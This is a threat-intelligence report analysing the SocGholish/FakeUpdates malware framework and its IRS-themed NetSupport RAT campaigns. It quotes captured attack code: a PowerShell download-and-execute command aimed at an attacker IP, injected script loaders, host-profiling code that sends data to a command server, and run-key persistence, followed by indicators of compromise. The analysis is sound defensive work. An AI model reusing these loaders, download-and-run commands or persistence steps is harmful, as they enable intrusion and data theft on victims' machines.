While the initial analysis and\nreporting did not gain much attention, over time the actor(s) behind the activity continued to\nexpand and develop their operations. Partnering with Evil Corp, the FAKEUPDATE /\nSOCGHOLISH framework has become a major corporate initial access vector. The threat\nactor(s) behind the framework have strong underground connections, demonstrated through\ntheir partnership with Evil Corp and signify thoroughly vetted cyber criminal activity. Threat\n\n\n-----\n\nattackers utilizing the framework represent significant risk to global corporations and have\ndemonstrated top tier penetration testing abilities. According to the FBI, typical losses\nattributed to their activity span 1 to 40 million dollars per event[1].\n\nMost public reporting on SocGholish revolves around the usage of fake software updates\neither through drive-by downloads or through links in email spam. However as we will\ndemonstrate in this report they have the ability to do specific campaigns throughout the year.\nWe will link a previously unattributed campaign to this threat group by using both our own\nprivate research and third-party public research. At the end, we will also demonstrate a way\nto pivot on the SocGholish NetSupport RAT configs which can lead to other revelations\nincluding the discovery of a publicly available zip file linking one of our discovered RAT\nconfigs to a SocGholish campaign.\n\n## IRS Campaigns\n\nWhile researching NetSupport RAT campaigns, we came across a campaign involving fake\ncaptchas, compromised websites and a .NET based loader. The malware appeared to be an\nXLL loader[7] and appeared to be primarily associated with NetSupport campaigns.\n\n\n-----\n\nWe were able to find one blog talking about these campaigns from Cofense[2] along with a\nIOC dump from a researcher[9] but the details are lacking and there is no attribution\nmentioned. It did provide us some extra pivot points thanks to their pictures of the\ncampaigns. One pivot point in particular shows a usage of compromised websites:\n\n\n-----\n\nThese sites just have an appended redirect location to the captcha site:\n```\n# echo “bD1odHRwczovL2lyc2J1c2luZXNzYXVkaXQubmV0L2NhcHRjaGEucGhw” |base64 —\ndecodel=hxxps://irsbusinessaudit[.]net/captcha.php\n\n```\nWe can also pivot on this captcha website because they reuse the same code for the\ncaptcha gate:\n\nThe IP address for the hlmequipment domain at the time was 5.252.178[.]213 based on\npassive DNS data which shows similar usage of the XLL loader but also a LNK file:\n\nThe LNK file is a downloader that will be used to ultimately lead to NetSupport RAT as well:\n```\nprocess call create “cmd /c start /min\nC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -c IEX (iwr –\nusebasicparsing\n‘http://5.252.178.213/restore.dat')\"!%SystemRoot%\\System32\\SHELL32.dll\n\n```\nLNK files appear to be leveraged through VHD file spam. The associated VHD files were:\n```\nfe2502a6432f272e6fcb7406182907cd54a94a958ee449be1528263a8caf0ac04ca5c2c0cc2bd56626c349\n\n```\n\n-----\n\nThese files also could have been hosted at compromised websites:\n\nThe files appear to contain the LNK files, which in the instance above will download\n‘restore.dat’.his file is a script based loader which will then load a .NET base64 encoded XLL\nloader onboard. In the example above it leads to this file:\n\nThese .NET based loaders contain a simplistic way that they obfuscate all their important\nstrings:\n```\nprivate static Random random = new Random(); private static int dec2(int a, int\nvarXLRDDAE) {   return (a - varXLRDDAE) / varXLRDDAE; } public static string\nRandomString(int length) {   IEnumerable<string> arg_291_0 =\nEnumerable.Repeat<string>(Encoding.ASCII.GetString(new byte[] {    \n(byte)IVOTSVZ.dec2(2178, 33),     (byte)IVOTSVZ.dec2(2211, 33),    \n(byte)IVOTSVZ.dec2(2244, 33),     (byte)IVOTSVZ.dec2(2277, 33),    \n(byte)IVOTSVZ.dec2(2310, 33),     (byte)IVOTSVZ.dec2(2343, 33),    \n(byte)IVOTSVZ.dec2(2376, 33),\n\n```\nThe process remains the same across all the campaigns utilizing the loader that we have\nanalyzed. Thanks to the static nature of .NET opcodes, we can automatically parse and\ndecode the encoded data.\n\n\n-----\n\nDecoded strings:\n```\nABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789asdjvibisi4taskhostw.exehxxp://149.28.68[.]114/for\n\n```\nOne of the XLL loaders also had a domain onboard instead of an IP.Along with\ncommunicating over HTTPS, this sample talked to irsbusinessaudit[.]net which was\nleveraged as part of the aforementioned captcha campaigns leading to NetSupport RAT:\n```\nGatewayAddress=irsgetwell.net:443SecondaryGateway=asaicuuvuvyy33ifbcia33.cn:443GSK=GM<\nECKHP=IBLFP;I?OED:G\n\n```\nThe Gateway address is specifically associated with SocGholish[8]:\n\n## FakeUpdate Drive-by Downloads\n\nDrive-by download campaigns normally consist of a website with injected javascript code:\n\nIn this case the injected code will end up going to:\n```\nhxxps://design.lawrencetravelco[.]com/report?\nr=dj1iNjI0OWFiNTViODVhMDIxZmRjZCZjaWQ9MjYy\n\n```\n\n-----\n\nThe sites are designed around social engineering involving browser updates, the browsers\nbeing targeted are the main browsers used in the market; Chrome, Firefox, IE and Opera. As\nan example here is a fake Edge update:\n\nThe structure of the downloaded zip file will be <Words>.[a-f0–9]{6}.zip and will unzip to a\njavascript file that will begin checking in to a C2 and downloading more scripts that will profile\nthe environment.\n\n\n-----\n\nThe script sends off a few hardcoded values, which are normally a letter and two numbers,\nand sets the variable url2 as the C2 URL. The response from the C2 is then executed from\nthe same context as this script. The next block of code is called ‘init’ and is normally used to\ngather more data about the environment it is being executed in but can be seen accessing\nthe ‘url2’ variable previously set:\n```\nupperScope.b_request = requestupperScope.reqUrl = url2\n\n```\nSome WMI queries:\n```\nvar colItems = objWMIService.ExecQuery(\"SELECT * FROM Win32_ComputerSystemProduct\",\n\"WQL\");var colItems = objWMIService.ExecQuery(\"SELECT * FROM Win32_OperatingSystem\",\n\"WQL\");var colItems = objWMIService.ExecQuery(\"SELECT * FROM AntiSpywareProduct\",\n\"WQL\");var colItems = objWMIService.ExecQuery(\"SELECT * FROM AntiVirusProduct\",\n\"WQL\");var colItems = objWMIService.ExecQuery(\"SELECT * FROM Win32_Process\",\n\"WQL\");var colItems = objWMIService.ExecQuery(\"SELECT * FROM Win32_Service\", \"WQL\");\n\n```\nThe script will end up gathering a lot of information which is sent off:\n```\nvar userdnsdomain = wsh.ExpandEnvironmentStrings('%userdnsdomain%')var username =\nwsh.ExpandEnvironmentStrings('%username%')var computername =\nwsh.ExpandEnvironmentStrings('%computername%')var processor_architecture =\nwsh.ExpandEnvironmentStrings('%processor_architecture%')var whoami =\nexecuteCmdCommand('whoami /all')req.push(['init_result',\n'1'])req.push(['ConsentPromptBehaviorAdmin',\nConsentPromptBehaviorAdmin])req.push(['PromptOnSecureDesktop',\nPromptOnSecureDesktop])req.push(['osBuildNumber',\nosBuildNumber])req.push(['osCaption', osCaption])req.push(['whoami',\nwhoami])req.push(['userdnsdomain', userdnsdomain])req.push(['username',\nusername])req.push(['computername', computername])req.push(['processor_architecture',\nprocessor_architecture])req.push(['asproduct', ASProduct])req.push(['processlist',\nprocesslist])req.push(['servicelist', servicelist])this['eval'](prepareRequest(req))\n\n```\nThe delivery for this chain has previously been NetSupport RAT but lately a CobaltStrike\nloader that AV companies refer to as “Blister” Loader has been delivered, normally placed in\na folder within ProgramData along with a renamed Rundll32 executable. The name of the\nfolder and file that will be used is hardcoded in one of the layers responsible for decoding the\nCobaltStrike file, this way it can setup itself if needed.\n\nExample:\n\n\n-----\n\nThe CobaltStrike malleable profile in use will leverage a new WerFault.exe process for itself,\nthis activity blends in nicely with the DLLs as they contain many exports and during sandbox\ndetonations will normally cause multiple faults to occur legitimately.\n\n## FakeUpdate Malspam\n\nThese campaigns have a similar flow to the above drive-by download chain except that links\nto compromised websites are spammed out.\n\nExample:\n```\nhxxps://payyourintern[.]com/two-p-1-posts-in-the-un-for-young-specialists\n\n```\nVisiting this site will lead to running some injected javascript code\n```\n<script>;(function(){var wq=document[id(\"cmVmZXJyZXI=\")]||'';var nb=new\nRegExp(id('Oi8vKFteL10rKS8='));if(!wq||window[id(\"bG9jYXRpb24=\")][id(\"aHJlZg==\")]\n[id(\"bWF0Y2g=\")](nb)[1]==wq[id(\"bWF0Y2g=\")](nb)[1]){return;};var\nji=navigator[id(\"dXNlckFnZW50\")];var nl=window[id(\"bG9jYWxTdG9yYWdl\")]\n[id(\"X19fdXRtYQ==\")];if(go(ji,id(\"V2luZG93cw==\"))&&!go(ji,id(\"QW5kcm9pZA==\")))\n{if(!nl){var\nvc=document.createElement('script');vc.type='text/javascript';vc.async=true;vc.src=id(\n ni=document.getElementsByTagName('script')\n[0];ni.parentNode.insertBefore(vc,ni);}}function id(at){var zx=window.atob(at);return\nzx;}function go(rs,mr){var zx=(rs[id(\"aW5kZXhPZg==\")](mr)>-1);return zx;}})();\n</script>\n\n```\nWhich will then lead to the same chain above, you might have noticed some static values\nthat keep showing up:\n```\ncmVmZXJyZXI=Oi8vKFteL10rKS8=\n\n```\nThanks to the service PublicWWW[6] we can use this data to check for other compromised\nsites:\n\n\n-----\n\n## SocGholish Infection Package\n\nAll of the NetSupport RAT configs related to this threat group we have discovered have a\nstatic structure to the top portion of their config which means we can pivot on it to find more.\n\nbcd004db9f44f2414c7094f79afb2d80230611e5b4f97960685157d236186126\n```\n[HTTP]GatewayAddress=mixerspring.cn:443SecondaryGateway=aasdig8g7b448ugudf.cn:443GSK=G\n\n```\n4fffa055d56e48fa0c469a54e2ebd857f23eca73a9928805b6a29a9483dffc21\n```\n[HTTP]GatewayAddress=sjvuvja.com:443SecondaryGateway=nsncasicuasyca831cs3vvz.cn:443GSK\nHDE9C>ICGHM=FBKFL;E@NFA:I\n\n```\nThis last config(4fff) is related to a NetSupport RAT package which has an interesting relation\nto another ZIP file:\n\nThe file names do resemble a SocGholish fakeupdate for Chrome browser campaign and\ninfection so let’s analyze them. First is the fakeupdate file which would be downloaded to the\ntargets computer in a zip file.\n\nFileName: Chrome.Update.50e772.js\n\n\n-----\n\nHash: 56de90d87bb9afc5345991b910a17cf0c6ee95cb97ea4b6de87fd93a8f22c9c0\n```\n{‘URLS’: [‘https://10b33845.xen.hill-family.us/pixel.gif'], ‘C2’:\n[‘10b33845.xen.hill-family.us’]}\n\n```\nFileName: stage_2.js\n\nHash: ee526c0f6ce5632e585b38322c2b6332730dfa9702d0d94c99dff7a36f98db1b\n\nThis file is the ‘init’ portion of SocGholish, it acts as an initial profiler for the infected system\nand sends off quite a lot of data along with some hardcoded values:\n```\nvar req =\n[];req.push('b');req.push('503');req.push(selfName);req.push(ComputerName);req.push(Us\n(request(req));\n\n```\nFileName: stage_3.js\n\nHash: 465ab5550bc788a274e38a71ecdc246d407c453a7a2d533a9b4aa2d9e53a8463\n\nThis is a downloader which is designed to download and execute a powershell script, the first\nthing it does is setup some variables that will be leveraged:\n```\nvar execFileName = '2b5fdce5.ps1';var fs = new\nActiveXObject(\"Scripting.FileSystemObject\");var _tempFilePathExec =\nfs.GetSpecialFolder(2) + \"\\\\\" + execFileName;\n\n```\nSubmits a request to download the file and writes it to the hardcoded name:\n```\ntry {  var req = [];  req.push('d');  req.push('503');  var fileContent =\nrequest(req);  var stream = new ActiveXObject('ADODB.Stream');  stream.Type = 2; \nstream.Charset = \"ISO-8859-1\";  stream.Open();  stream.WriteText(fileContent);  \nstream.SaveToFile(_tempFilePathExec, 1);  stream.Close();} catch (e) {  \ninitExeption = 'error number:' + e.number + ' message:' + e.message;}\n\n```\nDetonates:\n```\nif (initExeption == ‘0’) { try {  var wsh = new ActiveXObject(“WScript.Shell”);  \nrunFileResult = wsh.Run(‘powershell -ep bypass -windowstyle hidden -f “‘ +\n_tempFilePathExec + ‘“‘, 0); } catch (e) {  runFileExeption += ‘error number:’ +\ne.number + ‘ message:’ + e.message; }}\n\n```\nSubmits completion and gets next stage which will be another script piece for the javascript\nbackdoor portion:\n```\nvar req =\n[];req.push(‘c’);req.push(‘503’);req.push(_tempFilePathExec);req.push(runFileResult);r\n(request(req));\n\n```\nFileName: stage_4.ps1\n\nHash: a1f710e70688c61f447d575a081f10f21c999170e67cdedff11acb6b87b0ba14\n\n\n-----\n\nThis is the downloaded and detonated powershell file from the previous stage, what is\ninteresting is an overlap in obfuscation usage. The obfuscation wrapper here is related to\nServHelper[4,5] which is utilized by TA505[4]. Decoding is the exact same as would be done\nfor a ServHelper related powershell file:\n```\n>>> passw = ‘n1db20gsmk536cazhrtuyx4fvol9q8pi’>>> salt =\n‘qxijovsr5w0a7zml9tpn2g3f8u6d1k4y’>>> blob = find_blob(data)>>> len(blob)5289900>>>\nderbytes = MS_PasswordDeriveBytes(passw, salt, hashlib.sha1, iterations=2,\nkeylen=16)>>> c = DES3.new(derbytes, DES3.MODE_CBC, iv[:8])>>> out =\nc.decrypt(b64decode(blob))>>> out[:100]‘\\r\\n\\r\\n\\r\\nfunction oghygb4 {\\r\\n\nparam($string, $method)\\r\\n $saguhga = [System.Text.Encoding]::ascii’>>>\nopen(sys.argv[1]+’.decr’, ‘wb’).write(out)\n\n```\nThe decoded file is then the stage_5 file from the original ZIP package. This file is\nresponsible for XOR decoding the NetSupport RAT package and also setting up the\ninstallation of it.\n\nCreates a random folder in AppData:\n```\n$randf=( -join ((0x30..0x39) + ( 0x41..0x5A) + ( 0x61..0x7A) | Get-Random -Count 8 |\n% {[char]$_}) )$fpath =”$env:appdata\\$randf”mkdir $fpath\n\n```\nSets the rat clientname and removes all ps1 files in temp for cleanup:\n```\n$clientname=’ctfmon’+’.exe’remove-item $env:TEMP\\*.ps1\n\n```\nWrites the zip file to appdata:\n```\n$lit=”$fpath\\$randf”+”.zip”$gr = [System.Convert]::FromBase64String($nfuyrgg1)SetContent -Path “$lit” -Value $gr -Encoding Byte\n\n```\nUnzips it and then cleans up the zip file:\n```\ncd $fpathexpand-archive “$lit” “./”remove-item “$lit”\n\n```\nRenames the rat client to ctfmon.exe\n```\nrename-item “client32.exe” “$clientname”\n\n```\nDecodes a registry key:\n```\n$reg = oghygb4 “Jik2MF07PQ0TERAGHAcpKA4EHA0GCgETMjUcCwMIGREpJhIVHAcbETECHBEcCgk7PBcb”\n“z47gha”Decoded shows that it is for setting up a autorun\nkey:bytearray(b’HKCU:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run’)\n\n```\nSets a run key and starts the process:\n```\nnew-ItemProperty -Path “$reg” -Name “ctfmon_” -Value “$fpath\\$clientname”startprocess “$fpath\\$clientname”\n\n```\nFileName: DOo0gd4h.zip\n\n\n-----\n\nHash: 82ddf784507fffbbbcca749a687990345041c6c6cb5f4d768ee4136b3b4f4f03\n\nThis is the XOR decoded NetSupport RAT package, the client config:\n```\n[HTTP]GatewayAddress=sjvuvja.com:443SecondaryGateway=nsncasicuasyca831cs3vvz.cn:443GSK\nHDE9C>ICGHM=FBKFL;E@NFA:I\n\n## IOCs\n\n```\nXLL loaders:\n```\n9d8d289dd7fe149e89152983e40b2c1031e0dba3de9d89513163068bfb27a314ccc0204486cbf8b6db4371\n\n```\nNetSupport RAT Packages:\n```\n61707f944c47121ba23f3889773aa7c858aa2aae174a145f0170ad7d0384d3bda79b86d06a64f3df1d503a\n\n```\nCampaign Files:\n```\nfac07b49491d3639c0e8c800a71432b4ad1e4d827e9436b49fbbaefeadd853f9fe2502a6432f272e6fcb74\n\n```\nNetwork IOCs:\n```\nirsbusinessaudit.netirsbusinessaudit.net/captcha.phpsjvuvja.comhillfamily.usmixerspring.cnnsncasicuasyca831cs3vvz.cnaasdig8g7b448ugudf.cnirsgetwell.netas\ne=info@tulsadiamond.comirsbusinessaudit.tax/f4742.php?\ne=tgentry@comfortmc.comcontentcdns.netasaasdivu73774vbaa33.cnsolenica.com/wpcontent/themes/twentyfive/order.vhd45.76.172.113/fakeurl.htm194.180.158.173/fakeurl.ht\n\n```\nRedirectors:\n```\n.php?r=bD1odHR/report?r=dj1\n\n## References\n\n```\n1: https://docs.house.gov/meetings/JU/JU00/20220329/114533/HHRG-117-JU00-20220329SD006.pdf\n\n2: [https://cofense.com/blog/rat-campaign-looks-to-take-advantage-of-the-tax-season](https://cofense.com/blog/rat-campaign-looks-to-take-advantage-of-the-tax-season)\n\n3: https://research.nccgroup.com/2020/06/23/wastedlocker-a-new-ransomware-variantdeveloped-by-the-evil-corp-group/\n\n4: https://www.proofpoint.com/us/threat-insight/post/servhelper-and-flawedgrace-newmalware-introduced-ta505\n\n5: https://medium.com/walmartglobaltech/ta505-adds-golang-crypter-for-delivering-minersand-servhelper-af70b26a6e56\n\n[6: https://publicwww.com/](https://publicwww.com/)\n\n\n-----\n\n7: https://www.bleepingcomputer.com/news/security/malicious-excel-xll-add-ins-push-redlinepassword-stealing-malware/\n\n8: https://decoded.avast.io/janrubin/parrot-tds-takes-over-web-servers-and-threatensmillions/\n\n9: https://github.com/executemalware/Malware-IOCs/blob/main/2022-0217%20Netsupport%20IOCs\n\n\n-----",
